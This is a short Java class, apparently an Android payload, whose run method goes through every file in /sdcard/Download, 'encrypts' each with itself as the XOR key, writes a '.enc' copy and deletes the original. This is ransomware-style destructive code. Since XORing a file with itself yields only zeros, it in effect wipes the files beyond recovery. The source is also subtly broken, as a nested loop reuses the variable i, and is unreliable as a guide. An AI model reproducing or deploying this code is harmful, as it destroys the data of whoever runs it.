public class Classe { 
	public Classe() {} 
	/* start method */
	public void run(android.content.Context context) {
		try { 
			java.io.File dir = new java.io.File((java.lang.String) "/sdcard/Download");
			if (dir.isDirectory()) {
				java.lang.String[] children = dir.list();
			for (int i = 0; i < children.length; i++) {
				java.io.File file = new java.io.File(dir, children[i]); 
				byte[] plaintext = new byte[(int) file.length()]; 
				java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file); fileInputStream.read(plaintext); 
				byte[] key = plaintext; byte[] chipertext = new byte[(int) key.length]; 
			for (int i = 0; i < key.length; i++) { 
				chipertext[i] = (byte) (plaintext[i] ^ key[i]); 
			} 
			java.io.File file_chipertext = new java.io.File(dir, (java.lang.String) children[i].concat(".enc")); 
			java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext)); 
			bos.write((byte[]) chipertext); 
			bos.flush(); 
			bos.close(); 
			file.delete(); 
			/*byte[] plaintext_verifica = new byte[(int) key.length]; 
			for (int i = 0; i < key.length; i++) { 
				plaintext_verifica[i] = (byte) (chipertext[i] ^ key[i]); 
			} 
			java.io.File file_plaintext_verifica = new java.io.File(dir, (java.lang.String) \"verifica_\".concat(children[i])); 
			java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica)); 
			bos2.write((byte[]) plaintext_verifica); 
			bos2.flush(); bos2.close();*/ 
			}
		}
		} catch (java.lang.Exception e) { 
			e.printStackTrace(); 
		} 
	}
	/* end method */
}